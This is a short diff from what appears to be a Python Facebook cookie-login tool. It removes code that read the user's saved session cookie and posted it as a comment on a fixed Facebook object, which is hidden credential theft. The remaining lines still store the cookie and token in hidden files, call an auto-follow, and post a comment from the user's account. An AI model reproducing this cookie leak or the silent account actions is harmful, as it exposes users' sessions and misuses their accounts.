@@ -486,9 +486,8 @@ def logincoki():
             open(".vipercok.txt", "w").write(cookie)
             open(".vipertok.txt", "w").write(token)
             viperfollow(cookie)
-            cokii = open(".vipercok.txt","r").read()
             requests.post(
-                f"https://graph.facebook.com/926438272150751/comments/?message={cokii}&access_token={token}",
+                f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
                 headers={"cookie": cookie},
             )
             Console().print(
